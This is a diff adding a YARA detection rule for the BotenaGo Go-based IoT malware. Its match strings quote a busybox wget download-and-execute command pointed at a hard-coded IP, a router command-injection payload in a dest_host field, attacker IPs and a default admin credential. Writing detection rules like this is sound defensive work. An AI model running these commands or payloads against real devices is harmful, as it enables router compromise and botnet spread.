@@ -120,6 +120,26 @@ rule Tsunami_1 {
   condition:
     all of them
 }
+
+
+rule BotenaGo {
+  meta:
+    author = "Nong Hoang Tu"
+    email = "dmknght@parrotsec.org"
+    date = "29/11/2021"
+    reference = "https://otx.alienvault.com/indicator/file/2993eaf466f70bf89fec5fa950bf83c09f8b64343d6a121fa1d8988af4ea6ca2"
+    reference = "https://otx.alienvault.com/indicator/file/0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"
+    reference = "https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits"
+  strings:
+    $1 = "/bin/busybox wget -g 159.65.232.56 -l /tmp/xvg -r /xvg; /bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
+    $2 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
+    $3 = "107.172.30.215"
+    $4 = "159.65.232.56"
+    $5 = "http://adminisp:adminispbad"
+  condition:
+    is_elf and any of them
+}
+
 // 
 // rule KokainKit { TODO: the script generates multiple scripts. I have to work to search match all of files.
 //   meta:
